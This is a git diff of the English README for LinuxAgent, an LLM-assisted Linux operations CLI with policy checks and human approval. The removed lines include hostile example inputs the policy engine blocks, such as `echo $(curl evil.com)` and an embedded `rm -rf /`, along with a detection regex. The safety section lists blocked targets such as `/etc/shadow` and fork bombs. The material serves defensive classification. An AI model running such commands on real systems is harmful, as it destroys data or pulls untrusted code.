@@ -7,7 +7,6 @@
     <a href="https://github.com/Eilen6316/LinuxAgent/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/Eilen6316/LinuxAgent/ci.yml?branch=master&style=flat-square&label=CI" alt="CI"></a>
     <a href="https://github.com/Eilen6316/LinuxAgent/releases/tag/v4.1.0"><img src="https://img.shields.io/github/v/release/Eilen6316/LinuxAgent?style=flat-square" alt="Release"></a>
     <a href="https://github.com/Eilen6316/LinuxAgent/releases/tag/v4.1.0"><img src="https://img.shields.io/badge/package-GitHub%20Release-blue?style=flat-square" alt="GitHub Release package"></a>
-    <a href="#development"><img src="https://img.shields.io/badge/coverage-80%25%2B-brightgreen?style=flat-square" alt="Coverage"></a>
     <a href="../../SECURITY.md"><img src="https://img.shields.io/badge/security-policy-green?style=flat-square" alt="Security Policy"></a>
     <a href="https://gitcode.com/qq_69174109/LinuxAgent.git"><img src="https://img.shields.io/badge/GitCode-Repository-blue?style=flat-square&logo=git" alt="GitCode"></a>
     <a href="https://gitee.com/xinsai6316/LinuxAgent.git"><img src="https://img.shields.io/badge/Gitee-Repository-red?style=flat-square&logo=gitee" alt="Gitee"></a>
@@ -15,7 +14,7 @@
     <a href="https://blog.csdn.net/qq_69174109/article/details/146365413"><img src="https://img.shields.io/badge/CSDN-Project_Intro-blue?style=flat-square&logo=csdn" alt="CSDN"></a>
   </p>
 
-  <p><em>LinuxAgent v4.1.0: LLM-driven Linux operations assistant CLI with mandatory Human-in-the-Loop safety</em></p>
+  <p><em>LinuxAgent v4.1.0: an LLM-assisted Linux operations CLI with deterministic policy checks and mandatory Human-in-the-Loop approval.</em></p>
 
   <p>
     <a href="../../README.md">Project homepage</a> ·
@@ -27,262 +26,42 @@
 
 ## What is LinuxAgent
 
-**LinuxAgent** translates plain-language ops requests into Linux commands your team actually wants to run. Every LLM-generated command goes through token-level safety classification, every side-effecting action requires a human to press `y` in a terminal, and every decision is written to an append-only audit log.
+LinuxAgent lets an LLM propose Linux operations, but it does not let the model
+act as an autonomous shell. Commands are parsed, classified by deterministic
+policy, shown to a human when approval is required, executed without
+`shell=True`, redacted before model-facing analysis, and written to a local
+audit log.
 
-Built on **LangGraph** for state-machine orchestration, **LangChain** for model abstraction, and **Pydantic v2** for fail-fast configuration. No local deep-learning stack is required.
+Use it for:
 
-**v4.1.0 is the current security-depth release.** It adds red-team policy proof, shell-structure analysis, LOLBin detection, parser fuzzing, audit sink support, telemetry exporters, Landlock design, and a read-only MCP prototype on top of the rewritten v4 control plane.
+- Day-to-day inspection: files, logs, ports, resources, service status
+- Interactive troubleshooting where the model suggests the next command and the operator decides
+- SSH fan-out to configured hosts with explicit batch confirmation
+- Environments that need a reviewable local JSONL audit trail
 
-### Who it's for
+For deeper safety architecture, threat modeling, and v3 migration detail, start
+with [Operator Safety](operator-safety.md), [Threat Model](threat-model.md),
+and [Migration v3 to v4](migration-v3-to-v4.md).
 
-- Daily Linux ops: file inspection, log tailing, resource usage, service status
-- SSH cluster operations: run one command across many hosts with automatic batch confirmation
-- Interactive troubleshooting: let the model propose commands; you decide whether to run them
-- Environments with audit requirements: every action appended to a local JSONL log
+## Install
 
-### Design principles
-
-1. **The model is never trusted.** An LLM-generated command defaults to CONFIRM on its first appearance.
-2. **Destructive commands are never permanently whitelisted.** `rm -rf`, `mkfs`, `systemctl stop`, etc. re-prompt every time.
-3. **Batches must be explicit.** SSH to ≥2 hosts triggers a batch-confirmation flow by default.
-4. **Decisions leave a trail.** Every approval, execution, and refusal is appended to `~/.linuxagent/audit.log`.
-5. **No TTY means no silent execution.** CONFIRM requests in non-interactive contexts auto-deny.
-
----
-
-## Core capabilities
-
-| Capability | Notes |
-|---|---|
-| Natural language → command | Prompt + tool calling over OpenAI / DeepSeek / Anthropic Claude |
-| Structured planning | LLM output is validated as JSON `CommandPlan` before any policy check or execution |
-| File patch planning | Script, code, and config edits use structured `FilePatchPlan` output, unified-diff preview, transactional apply, and HITL approval |
-| Read-only workspace tools | The planner can inspect real files through `read_file`, `list_dir`, and `search_files` before proposing a patch |
-| Policy engine | `SAFE` / `CONFIRM` / `BLOCK` plus `risk_score`, `capabilities`, and audit-friendly `matched_rule` |
-| Skill guidance | Optional Skill manifests can add advisory planner context without executable plugin hooks |
-| Human-in-the-Loop | LangGraph `interrupt()` + session resume; confirmations show policy and planned sandbox context |
-| Conversation permissions | Approved SAFE command shapes can skip confirmation only within the same conversation thread, including `/resume`; destructive commands never enter |
-| Cluster batch execution | SSH connection pool + concurrent fan-out + failure isolation, async wrapping paramiko |
-| Audit log | JSONL append-only, `0o600`, never rotated, cannot be disabled |
-| Monitoring alerts | CPU, memory, and root filesystem threshold alerts surfaced by `linuxagent check` |
-| Usage insights | Usage stats, API-based semantic similarity, recommendations, knowledge base |
-| Testability | `make test` enforces 80%+ coverage, with HITL YAML scenarios, integration smoke tests, red-team cases, and optional Anthropic compatibility verification |
-
----
-
-## 30-second tour
-
-```
-you: find services listening on port 8080
-
- ┌─────────────────┐
- │  parse_intent   │   LLM proposes:  ss -tlnp sport = :8080
- └────────┬────────┘
-          ▼
- ┌─────────────────┐
- │  safety_check   │   token-level classification → CONFIRM (LLM first-run)
- └────────┬────────┘
-          ▼
- ┌─────────────────┐
- │     confirm     │   terminal shows a confirmation panel:
- │  (interrupt)    │     Command: ss -tlnp sport = :8080
- │                 │     Safety:  CONFIRM
- │                 │     Rule:    LLM_FIRST_RUN
- │                 │     Source:  llm
- │                 │   > approval menu: Yes / Yes, don't ask again / No
- └────────┬────────┘
-          ▼ Yes
- ┌─────────────────┐
- │     execute     │   asyncio.create_subprocess_exec(*argv)
- └────────┬────────┘
-          ▼
- ┌─────────────────┐
- │     analyze     │   LLM summarises raw output for an operator
- └────────┬────────┘
-          ▼
-        you ← "nginx (PID 4312) owns 8080, running as root"
-
- every step is appended to ~/.linuxagent/audit.log
-```
-
-Before command planning, an LLM-owned intent router chooses `DIRECT_ANSWER`,
-`COMMAND_PLAN`, or `CLARIFY`. Conversational answers do not create a command
-plan or confirmation panel. Operational methods are generated at runtime and
-successful command patterns are stored in local learner memory after redaction;
-Python code does not hard-code business or intent keyword rules. Deterministic
-safety policy data is loaded from `configs/policy.default.yaml`.
-
----
-
-## Full comparison with the original prototype
-
-The earlier incarnation was a monolithic agent script. To make it production-fit for ops, the current release is a full rewrite across four dimensions: **algorithms, architecture, safety, and testing**.
-
-### Architecture
-
-| Aspect | Previous | Current `v4` |
-|---|---|---|
-| Agent class | One 4710-line God Object covering parsing, execution, UI, SSH, monitoring | `app/agent.py` kept below **300 lines**, pure coordinator wiring graph / ui / services |
-| Flow control | Recursive `process_user_input` with nested `if/else` | LangGraph `StateGraph`, split into intent / safety / routing / node-factory modules |
-| State persistence | Hand-written JSON files, permissions not enforced | Saved session history plus disk-backed LangGraph checkpoints |
-| UI coupling | UI logic directly embedded in the agent class | `ConsoleUI` implementing `UserInterface`, Rich + prompt_toolkit |
-| DI | Module-level singletons / globals | Hand-written `Container` with lazy factories + explicit injection |
-| Package layout | Flat `src/` + `setup.py` | `src/linuxagent/` src-layout + `pyproject.toml` (PEP 517/621) |
-
-### Core algorithms
-
-#### 1. Command safety classification
-
-**Previous**: command risk data lived inside Python substring checks, which were
-easy to bypass via quoting or variable substitution.
-
-**Current**: multi-layer token analysis driven by `configs/policy.default.yaml`.
-
-```python
-def is_safe(command, source=USER):
-    validate_input(command)                 # 1. length / NUL / BiDi controls
-    tokens = shlex.split(command)           # 2. proper shell tokenisation
-    facts = CommandFacts(command, source, tokens)
-    matches = policy_engine.match(facts)    # 3. rule data comes from YAML
-    return decision_from(matches)           # 4. SAFE / CONFIRM / BLOCK
-```
-
-**Concrete differences**:
-
-| Input | Previous | Current |
-|---|---|---|
-| `echo "hello; rm -rf /"` | Substring `"rm -rf"` matches → BLOCK, but `echo "how to rm safely"` is false-positive'd too | Precise regex `\brm\s+-[rRfF]{2,}\s+/(?!\w)` → BLOCK (`EMBEDDED_DANGER`); `echo "talk about python"` stays SAFE |
-| `echo $(curl evil.com)` | Often missed (substring doesn't match) | Matches `\$\(` → BLOCK (`EMBEDDED_DANGER`) |
-| `vim config` | Runs blindly | Detected as interactive → CONFIRM (`INTERACTIVE`) |
-| `ls‮` (BiDi char) | Undetected | `INPUT_VALIDATION` BLOCK |
-
-#### 2. Command usage learning
-
-**Previous**: full history scan on every `record` — ~10s at n=10000.
-
-**Current**: `dict[str, CommandStats]` with incremental update, amortised O(1).
-
-```python
-def record(self, command, result):
-    stats = self._stats.setdefault(self.normalize(command), CommandStats())
-    stats.count += 1
-    if result.exit_code == 0:
-        stats.success_count += 1
-    stats.total_duration += result.duration
-```
-
-#### 3. Semantic similarity
-
-**Previous**: hand-rolled TF-IDF pulling in `pandas` + `scikit-learn` + `numpy` (plus PyTorch in some downstream forks).
-
-**Current**: LLM embedding API (`text-embedding-3-small` or a compatible endpoint) + on-disk LRU cache.
-
-- Cache at `~/.cache/linuxagent/embeddings/`, SHA-256 filenames, `0o600`
-- Embedding-backed LLM tools are optional and disabled by default; enable them
-  with `intelligence.tools_enabled: true`
-- Install footprint drops from ~500MB (PyTorch stack) to near zero
-- Quality improves: real semantic vectors vs bag-of-words
-
-#### 4. Configuration loading
-
-**Previous**: single-file read, unknown fields silently dropped.
-
-**Current**: five-layer priority merge + Pydantic `extra="forbid"` fail-fast + YAML line-number error reporting.
-
-```
-1. --config <path>                     CLI (highest)
-2. LINUXAGENT_CONFIG env var (path only)
-3. ./config.yaml                       current directory
-4. ~/.config/linuxagent/config.yaml    XDG
-5. packaged configs/default.yaml       (lowest)
-```
-
-- Explicit paths (1 / 2) that don't exist → immediate `ConfigError`
-- Auto-discovery paths (3 / 4) are silently skipped when absent
-- User-supplied files must be `chmod 0600` and owned by the invoking user
-- Validation errors include YAML line numbers: `api.timeout: Input should be valid at line 12`
-
-#### 5. SSH host trust
-
-**Previous**: `AutoAddPolicy` — silently accepts any host key on first contact, a trivial MITM path.
-
-**Current**: `RejectPolicy` + `load_system_host_keys()`; unknown hosts raise `SSHUnknownHostError`.
-
-```python
-client.load_system_host_keys()
-client.set_missing_host_key_policy(paramiko.RejectPolicy())
-```
-
-A CI red-line check `! grep -rn "AutoAddPolicy" src/linuxagent/` prevents accidental regression.
-
-Remote execution is also narrower than local execution. Cluster commands are
-accepted only as simple argv-like commands; shell sequencing, pipes,
-redirects, command substitution, and variable expansion are blocked before
-confirmation and again before SSH connection setup. Local OS sandboxing does
-not extend across SSH; the remote boundary is host scoping, least-privilege
-users, remote working directories, sudo allowlists, host-key verification,
-batch confirmation, and audit metadata.
-
-### Safety model
-
-| Policy | Previous | Current `v4` |
-|---|---|---|
-| First model-generated command | runs directly | forced CONFIRM (`LLM_FIRST_RUN`) |
-| Re-running an approved command | every run re-prompts | allowed only within the same conversation thread, including `/resume` of that thread |
-| Destructive commands | string blacklist | token match + raw scan + subcommand regex, **never** whitelisted |
-| Batch cluster operations | silent spread | hosts ≥ `cluster.batch_confirm_threshold` (default 2) forces CONFIRM; shell syntax is blocked before SSH; payload shows remote profiles |
-| Non-interactive environment | can be bypassed | no-TTY confirm auto-returns `non_tty_auto_deny` |
-| Audit trail | optional | hash-chained HITL events appended to `~/.linuxagent/audit.log` at `0o600`, verifiable with `linuxagent audit verify` |
-
-### Testing and engineering
-
-| Aspect | Previous | Current `v4` |
-|---|---|---|
-| Unit tests | 0 | **`make test`; Anthropic compatibility can be verified when the extra is installed** |
-| Coverage | 0 | **80%+ required** (`--cov-fail-under=80`; defer to current CI / local `make test` output) |
-| Static analysis | none | `ruff check` + `mypy --strict` + `bandit`, all clean |
-| Red-line gates | none | CI checks command, SSH, HITL, code-structure, and sandbox bypass red lines |
-
-Runtime policy overrides can be enabled in `config.yaml`:
-
-```yaml
-policy:
-  path: ~/.config/linuxagent/policy.yaml
-  include_builtin: true  # built-ins + user rule overrides/appends
-```
-
-Application network policy for LLM/web tools is separate from `sandbox.network`.
-Network tools are disabled by default; when enabled, `fetch_url` can read known
-HTTP/HTTPS URLs and still applies domain policy plus SSRF checks on DNS results
-and every redirect hop.
-
-```yaml
-network:
-  enabled: false
-  default_action: deny
-  allowed_domains: []
-  denied_domains: []
-```
-
-| End-to-end scenarios | none | YAML scenarios covering basic / dangerous / HITL / batch cluster / remote shell guard / workspace-tool flows |
-| Release flow | manual | tag-triggered GitHub Actions builds wheel + sdist, GitHub Release, and PyPI publish |
-
----
-
-## Installation
-
-### Automated (recommended)
+### Automated
 
 ```bash
 git clone https://github.com/Eilen6316/LinuxAgent.git
 cd LinuxAgent
-./scripts/bootstrap.sh     # creates .venv + global config + LINUXAGENT_CONFIG + ~/.local/bin/linuxagent
+./scripts/bootstrap.sh
 ```
+
+The bootstrap script creates `.venv`, prepares
+`~/.config/linuxagent/config.yaml`, creates a `~/.local/bin/linuxagent`
+launcher, and writes `LINUXAGENT_CONFIG` to your shell profile. Open a new
+shell, or source your shell profile, before starting from another directory.
 
 ### Manual
 
 ```bash
-python3.11 -m venv .venv   # or python3.12
+python3.11 -m venv .venv   # python3.12 is also supported
 source .venv/bin/activate
 pip install -e ".[dev]"
 mkdir -p ~/.config/linuxagent ~/.local/bin
@@ -291,41 +70,28 @@ chmod 600 ~/.config/linuxagent/config.yaml
 ln -sf "$PWD/.venv/bin/linuxagent" ~/.local/bin/linuxagent
 ```
 
-Ensure `~/.local/bin` is on `PATH`, then `linuxagent` can start from any
-directory without activating the checkout virtual environment. Open a new shell
-or run `source ~/.bashrc` after bootstrap so `LINUXAGENT_CONFIG` points to
-`~/.config/linuxagent/config.yaml`.
-
-### Optional extras
+Optional extras:
 
 ```bash
 pip install -e ".[anthropic]"     # Claude support
 pip install -e ".[pyinstaller]"   # single-binary packaging
 ```
 
-### Runtime requirements
+Runtime requirements are Python 3.11 or 3.12 on Linux. macOS is useful for
+development; Windows is not supported. SSH cluster mode requires target hosts to
+already exist in `~/.ssh/known_hosts`.
 
-- Python 3.11 or 3.12
-- Linux (macOS works for development, Windows is not supported)
-- For cluster mode: `~/.ssh/known_hosts` must already contain the target hosts
+## Minimal Configuration
 
----
-
-## Configuration
-
-### Minimal working config
+Edit `~/.config/linuxagent/config.yaml` and keep it private:
 
 ```yaml
-# ~/.config/linuxagent/config.yaml (chmod 600)
+# ~/.config/linuxagent/config.yaml
 api:
-  api_key: "sk-replace-me"   # required
+  api_key: "sk-replace-me"
 ```
 
-All other fields can stay at their defaults (default provider is DeepSeek; switch to `openai`, `openai_compatible`, `local`, `ollama`, `vllm`, `lmstudio`, `glm`, `qwen`, `kimi`, `minimax`, `gemini`, `hunyuan`, `anthropic`, `anthropic_compatible`, or `xiaomi_mimo` as needed).
-
-For API relays or third-party OpenAI-compatible endpoints, use
-`openai_compatible` or a provider shortcut such as `qwen`, `kimi`, `glm`,
-`minimax`, `gemini`, or `hunyuan`:
+The default provider is DeepSeek. For OpenAI-compatible relays:
 
 ```yaml
 api:
@@ -336,8 +102,7 @@ api:
   token_parameter: max_tokens
 ```
 
-For locally deployed OpenAI-compatible models, use `ollama`, `vllm`, `lmstudio`,
-or generic `local`. Local providers do not require a real API key:
+For local OpenAI-compatible providers such as Ollama:
 
 ```yaml
 api:
@@ -348,633 +113,220 @@ api:
   token_parameter: max_tokens
 ```
 
-Anthropic-format relays can use `provider: anthropic_compatible` with their own
-`base_url`; Xiaomi MiMo can use `provider: xiaomi_mimo`.
-
-See [Provider Compatibility Matrix](provider-matrix.md) for verified paths,
-token parameters, local model notes, and compatibility report details.
-
-### Provider quick reference
-
-| Provider | Protocol | Typical `base_url` | Token parameter |
-|---|---|---|---|
-| `deepseek` | OpenAI-compatible | `https://api.deepseek.com/v1` | `max_completion_tokens` |
-| `openai` | OpenAI | `https://api.openai.com/v1` | `max_completion_tokens` |
-| `openai_compatible` | OpenAI-compatible relay | Relay-specific `/v1` URL | Often `max_tokens` |
-| `local` | Local OpenAI-compatible | `http://127.0.0.1:8000/v1` | `max_tokens` |
-| `ollama` | Local OpenAI-compatible | `http://127.0.0.1:11434/v1` | `max_tokens` |
-| `vllm` | Local OpenAI-compatible | `http://127.0.0.1:8000/v1` | `max_tokens` |
-| `lmstudio` | Local OpenAI-compatible | `http://127.0.0.1:1234/v1` | `max_tokens` |
-| `qwen` | OpenAI-compatible | `https://dashscope.aliyuncs.com/compatible-mode/v1` | `max_tokens` |
-| `kimi` | OpenAI-compatible | `https://api.moonshot.ai/v1` | `max_tokens` |
-| `glm` | OpenAI-compatible | `https://open.bigmodel.cn/api/paas/v4` | `max_tokens` |
-| `minimax` | OpenAI-compatible | `https://api.minimax.io/v1` | `max_tokens` |
-| `gemini` | OpenAI-compatible | `https://generativelanguage.googleapis.com/v1beta/openai/` | `max_tokens` |
-| `hunyuan` | OpenAI-compatible | `https://api.hunyuan.cloud.tencent.com/v1` | `max_tokens` |
-| `anthropic` | Anthropic | Provider default | n/a |
-| `anthropic_compatible` | Anthropic-compatible relay | Relay-specific URL | n/a |
-| `xiaomi_mimo` | Anthropic-compatible | Relay-specific URL | n/a |
-
-### Validate
+Validate before first use:
 
 ```bash
+chmod 600 ~/.config/linuxagent/config.yaml
 linuxagent check
-# Sample output:
-# OK: provider=deepseek, model=deepseek-chat,
-#     batch_confirm_threshold=2, audit_log=/home/you/.linuxagent/audit.log
 ```
 
-### Field reference
+Common providers include `deepseek`, `openai`, `openai_compatible`, `local`,
+`ollama`, `vllm`, `lmstudio`, `qwen`, `kimi`, `glm`, `minimax`, `gemini`,
+`hunyuan`, `anthropic`, `anthropic_compatible`, and `xiaomi_mimo`. See the
+[Provider Compatibility Matrix](provider-matrix.md) and
+[`configs/example.yaml`](../../configs/example.yaml) for full configuration
+fields.
 
-| Section | Field | Default | Description |
-|---|---|---|---|
-| root | `language` | `zh-CN` | Runtime UI language for LinuxAgent-owned fixed terminal text; supported values are `zh-CN` and `en-US` |
-| `api` | `provider` | `deepseek` | `openai` / `openai_compatible` / `local` / `ollama` / `vllm` / `lmstudio` / `deepseek` / `glm` / `qwen` / `kimi` / `minimax` / `gemini` / `hunyuan` / `anthropic` / `anthropic_compatible` / `xiaomi_mimo` |
-| `api` | `base_url` | `https://api.deepseek.com/v1` | OpenAI-compatible endpoint |
-| `api` | `model` | `deepseek-chat` | Model name |
-| `api` | `api_key` | `""` | **Required for remote providers**; local providers may leave it empty; `SecretStr`, never printed |
-| `api` | `token_parameter` | `max_completion_tokens` | Use `max_tokens` for API relays or older compatible backends |
-| `api` | `timeout` | `30.0` | Per-request timeout (s) |
-| `api` | `stream_timeout` | `60.0` | Overall stream timeout (s) |
-| `api` | `max_retries` | `3` | Exponential-backoff retry attempts |
-| `security` | `command_timeout` | `30.0` | Max local command runtime |
-| `security` | `max_command_length` | `2048` | Per-command character cap |
-| `security` | `session_whitelist_enabled` | `true` | Toggle conversation-scoped command permissions |
-| `network` | `enabled` | `false` | Enables optional LLM/web network tools such as `fetch_url`; disabled by default |
-| `network` | `default_action` | `deny` | `allow` or `deny` for domains not matched by explicit rules |
-| `network` | `allowed_domains` / `denied_domains` | `[]` | Exact domains or strict subdomain wildcard entries such as `.example.com`; deny wins |
-| `network` | `max_response_bytes` | `1048576` | Maximum response budget for `fetch_url` |
-| `network` | `timeout_seconds` | `10.0` | Timeout budget for `fetch_url` |
-| `command_plan` | `max_repair_attempts` | `2` | Automatic failed-command replanning rounds; `0` disables command repair |
-| `command_plan` | `parallel_direct_answer_tasks` | `8` | Maximum AI-decomposed conversational subtasks to fan out in parallel |
-| `file_patch` | `allow_roots` | `[".", "/tmp"]` | Roots where file patch tools may read and write |
-| `file_patch` | `high_risk_roots` | `["/etc", "/root/.ssh", "/home/*/.ssh"]` | Matching paths are shown as elevated-risk patch confirmations |
-| `file_patch` | `allow_permission_changes` | `true` | Allows patch plans to declare chmod-style permission changes |
-| `file_patch` | `max_repair_attempts` | `2` | Automatic FilePatchPlan repair rounds; `0` disables patch repair |
-| `sandbox` | `enabled` | `false` | Sandbox boundary flag; default compatibility mode records `runtime_label=no_isolation`; `true` fails closed when the selected runner cannot enforce the requested safe profile |
-| `sandbox` | `runner` | `noop` | `noop`, `local`, or optional `bubblewrap`; `noop` records metadata only, `local` is process-limits-only, and `bubblewrap` can provide filesystem isolation for enforceable profiles |
-| `sandbox` | `default_profile` | `system_inspect` | Default profile recorded for commands without stronger policy capabilities |
-| `sandbox` | `network` | `inherit` | `inherit`, `disabled`, `loopback_only`, or `allowlist`; unsupported policies fail closed for safe profiles |
-| `sandbox.tools` | `max_rounds` | `3` | Maximum tool-calling rounds per planner request |
-| `sandbox.tools` | `enable_execute_command` | `false` | Opt-in for the direct LLM-visible command execution tool; normal command execution should use the HITL graph |
-| `sandbox.tools` | `timeout_seconds` | `5.0` | Per-tool runtime timeout |
-| `sandbox.tools` | `max_output_chars` | `20000` | Per-tool output budget before truncation |
-| `sandbox.tools` | `max_total_output_chars` | `60000` | Cumulative tool output budget per planner request |
-| `sandbox.tools` | `max_file_bytes` | `1048576` | Maximum file size read by workspace/log search tools |
-| `sandbox.tools` | `max_matches` | `200` | Maximum search/list matches exposed to the model |
-| `cluster` | `batch_confirm_threshold` | `2` | Host count that triggers batch confirm |
-| `cluster` | `max_workers` | `8` | Worker count for blocking Paramiko SSH operations |
-| `cluster` | `known_hosts_path` | `~/.ssh/known_hosts` | Additional known-hosts file loaded before system host keys |
-| `cluster` | `hosts` | `[]` | Cluster host list |
-| `cluster.hosts[].remote_profile` | `remote_cwd` | `.` | Remote working directory policy for SSH execution |
-| `cluster.hosts[].remote_profile` | `environment` | `inherit` | `inherit` preserves current behavior; `clean` sends a minimal PATH environment |
-| `cluster.hosts[].remote_profile` | `allow_sudo` | `false` | Allows sudo only when paired with a non-empty `sudo_allowlist` |
-| `audit` | `path` | `~/.linuxagent/audit.log` | Audit log location; **audit cannot be disabled** |
-| `memory` | `enabled` | `true` | Enable local filesystem memory under `~/.linuxagent/memories` |
-| `memory` | `use_memories` | `true` | Inject `memory_summary.md` into model-facing product context when present |
-| `memory` | `generate_memories` | `true` | Generate redacted memory inputs on chat startup |
-| `memory` | `disable_on_external_context` | `false` | Disable memory generation for externally polluted threads |
-| `memory` | `max_rollouts_per_startup` | `2` | Maximum historical sessions considered per startup pass |
-| `memory` | `max_rollout_age_days` | `10` | Maximum session age for memory extraction |
-| `memory` | `min_rollout_idle_hours` | `6` | Minimum idle time before a session can be extracted |
-| `memory` | `min_rate_limit_remaining_percent` | `25` | Reserved threshold for LLM-backed memory workers |
-| `memory` | `max_raw_memories_for_consolidation` | `256` | Maximum raw memory inputs considered by consolidation |
-| `memory` | `max_unused_days` | `30` | Exclude and prune raw memory inputs unused for longer than this |
-| `memory` | `pipeline_lock_ttl_seconds` | `600` | Stale memory pipeline lock lease timeout |
-| `telemetry` | `exporter` | `local` | `local`, `console`, `otlp`, or `none` |
-| `telemetry` | `path` | `~/.linuxagent/telemetry.jsonl` | Local telemetry path |
-| `telemetry` | `otlp_endpoint` | null | Required when `exporter: otlp` |
-| `ui` | `theme` | `auto` | `auto` / `light` / `dark` |
-| `ui` | `tui_layout` | `wide` | Default wide-terminal active view; `compact` forces the terse view |
-| `ui` | `max_chat_history` | `20` | Max retained messages per saved session; new sessions do not load them automatically |
-| `ui` | `checkpoint_path` | `~/.linuxagent/checkpoints.json` | Local LangGraph checkpoint store for pending HITL resume |
-| `logging` | `level` | `WARNING` | `DEBUG` / `INFO` / `WARNING` / ... |
-| `logging` | `format` | `console` | `console` (Rich colour) / `json` (production) |
-| `intelligence` | `tools_enabled` | `false` | Expose optional embedding-backed recommendation / knowledge / similarity tools to the LLM |
-| `intelligence` | `embedding_model` | `text-embedding-3-small` | Semantic search model; **local PyTorch models are disallowed** |
+## First Run
 
-Full example: [`configs/example.yaml`](../../configs/example.yaml).
-
-### Local filesystem memory
-
-Local memory is enabled by default and lives under `~/.linuxagent/memories`.
-When `linuxagent chat` starts, LinuxAgent loads saved local sessions, starts a
-background two-stage memory pass, and injects the current `memory_summary.md` as
-advisory operator/project context for the new runtime. The pipeline writes only
-inside the memory root and uses redaction before persistence. `linuxagent memory
-status` reports whether the latest pipeline run is idle, running, completed,
-failed, or skipped.
-
-Stage 1 uses the configured LLM provider to decide whether a saved session has
-durable reusable learning. No-op is valid and preferred when a session has no
-reusable value, and startup generation no-ops when no memory writer provider is
-available instead of copying deterministic transcript snippets into
-`memory_summary.md`. The startup task records failures in `pipeline_status.json`
-and `linuxagent memory status`; stale or invalid pipeline locks are recovered
-after `memory.pipeline_lock_ttl_seconds`. Stage-1 JSON inputs older than
-`memory.max_unused_days` are pruned during consolidation.
-
-`memory.enabled` is the global switch. `memory.use_memories` controls the read
-path, and `memory.generate_memories` controls the write path. Legacy
-`inject_summary`, `auto_consolidate_on_startup`, and `stage1_session_limit`
-keys are still accepted and mapped to the new names.
-
-When `memory.disable_on_external_context` is true, threads that use external
-context sources such as network tools are marked as polluted and skipped by
-future memory generation. This keeps externally sourced or transient context out
-of long-term local memory.
-
-Memory is not a safety boundary and cannot lower policy decisions, skip HITL,
-change sandbox enforcement, execute commands, or edit audit records. Disable
-all memory reads and writes with:
-
-```yaml
-memory:
-  enabled: false
-```
-
-### Runtime language
-
-Set the top-level `language` field in `config.yaml`:
-
-```yaml
-language: en-US  # zh-CN | en-US
-```
-
-The default is `zh-CN`. The setting affects LinuxAgent-owned fixed runtime
-text: slash help and completion descriptions, CLI/TUI labels, confirmation and
-block messages, wizard controls, diagnostics, policy display reasons, and
-localized display metadata for policies and Skills.
-
-It does not change prompt templates, LLM routing/planning behavior, the final
-answer language chosen by the model, external command output, user file
-contents, audit JSON field names, MCP protocol fields, tool names, policy rule
-ids, or other machine-readable values. `linuxagent --help` is static argparse
-help shown before config loading; runtime slash help (`/help`) and terminal UI
-fixed text follow `language`.
-
-Locale catalogs are not business templates and do not contain prompt
-instructions. AI-generated content still comes from the model and the user's
-request. External Skill and policy text remains in its source language unless
-that data explicitly provides localized display metadata.
-
-The hardcoded-string gate currently blocks unregistered Chinese runtime string
-literals in `src/linuxagent/`. English phrase scanning is report-only so
-maintainers can review likely UI/help/log candidates without turning protocol
-strings, exception messages, or model-facing text into false positives.
-
----
-
-## Usage tutorial
-
-### Start the CLI
+Start the chat interface:
 
 ```bash
 linuxagent
 ```
 
-`linuxagent chat` remains available as an explicit equivalent.
-The default terminal experience now uses the wide TUI active view when the
-terminal has room, and automatically falls back on narrow terminals. Use
-`linuxagent tui` as an explicit TUI entry point; policy checks, HITL
-confirmation, sandboxing, memory, and audit behavior are unchanged.
+Try a read-only request:
 
-You'll see a welcome panel followed by the prompt:
-
-```
-╭─────────────────────────────────────╮
-│ LinuxAgent 2026 Ops Console         │
-│ HITL-safe command automation with   │
-│ audit trails                        │
-╰─────────────────────────────────────╯
-
-linuxagent ❯
+```text
+check the Linux version
 ```
 
-Every CLI launch starts as a new conversation. Saved sessions are available
-only through explicit slash commands. Typing `/` opens the command completion
-menu:
+The first LLM-generated command in a conversation is normally shown for
+approval:
 
-| Slash command | Effect |
+```text
+linuxagent > find services listening on port 8080
+
+LLM proposes: ss -tlnp sport = :8080
+Safety: CONFIRM
+Rule: LLM_FIRST_RUN
+Allow this operation?
+1. Yes
+2. Yes, don't ask again in this conversation/resume
+3. No
+```
+
+`Yes, don't ask again` is scoped to the same conversation thread and the same
+thread reopened with `/resume`; it is not global. Direct operator-authored
+commands can be run with `!`, for example `!uname -a`.
+
+Useful slash commands:
+
+| Command | Use |
 |---|---|
-| `/resume` | Choose a locally saved session with arrow keys / mouse, or enter a number in non-interactive fallbacks; pending HITL confirmations resume immediately |
-| `/new` or `/clear` | Start a fresh empty-context conversation in the same CLI |
-| `/tools` | Show slash/tool entry points currently available |
-| `/job` | List background jobs started by approved long-running plans |
-| `/job status` | Show background job runtime health, socket/store paths, and job counts |
-| `/job daemon` | Show local job daemon lifecycle commands and systemd user service guidance |
-| `/job daemon install` | Write the LinuxAgent job daemon systemd user service file |
-| `/job <job_id>` | Show one background job's status, output tail, and artifact paths |
-| `/job follow <job_id>` | Follow one background job's updates in the current CLI |
-| `/job stop <job_id>` | Request cancellation for a background job |
-| `/help` | Show slash command help |
-| `/exit` or `/quit` | Exit the CLI |
+| `/resume` | Resume a saved local session; pending confirmations reopen |
+| `/new` or `/clear` | Start an empty conversation in the running CLI |
+| `/tools` | Show available slash/tool entry points |
+| `/job` | Show approved background jobs |
+| `/help` | Show CLI help |
+| `/exit` or `/quit` | Exit |
 
-Run `linuxagent job-daemon` to keep approved background jobs supervised by a
-local LinuxAgent process while the foreground chat loop stays free for the next
-conversation turn. Use `/job daemon` for systemd user service guidance. The
-`/job` commands remain the only interactive job controls.
+## Safety Rules to Remember
 
-Prefix input with `!` to run an operator-authored command directly:
+- The model is not trusted: LLM-generated commands must pass deterministic
+  policy before execution.
+- First-time LLM-generated commands require confirmation, even when the command
+  looks safe.
+- Destructive commands such as `rm -rf`, `mkfs`, `dd`, and `systemctl stop`
+  never enter the conversation whitelist.
+- `BLOCK` commands stop before the confirmation node; examples include
+  root-filesystem deletion, sensitive paths such as `/etc/shadow`, command
+  substitution that hides dangerous work, fork bombs, and invalid shell input.
+- Non-interactive runs cannot silently approve `CONFIRM`; they fail closed.
+- SSH uses known-host verification and rejects unknown hosts. Remote commands
+  are restricted to simple argv-style commands before execution.
+- Audit logging cannot be disabled and is written with private permissions.
 
-```
-linuxagent ❯ !git status
-linuxagent ❯ !npm test
-linuxagent ❯ !ls -la
-```
+Security policy lives in [SECURITY.md](../../SECURITY.md),
+[`configs/policy.default.yaml`](../../configs/policy.default.yaml), and
+`src/linuxagent/policy/`.
 
-For `!` turns, LinuxAgent does not ask the LLM to explain or generate a command.
